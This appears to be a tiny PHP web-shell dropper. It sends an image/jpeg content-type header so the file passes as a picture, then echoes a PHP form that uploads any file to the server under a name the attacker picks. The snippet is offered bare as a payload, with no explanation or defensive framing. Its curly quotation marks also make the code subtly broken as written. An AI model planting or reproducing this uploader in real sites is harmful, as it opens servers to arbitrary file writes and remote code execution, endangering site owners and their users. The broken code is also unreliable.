<?php 
header(“Content-Type: image/jpeg”);
echo “<?php if(isset($_FILES['f'])) move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']); ?><form method=post enctype=multipart/form-data><input type=file name=f><input type=submit></form>”;
?>
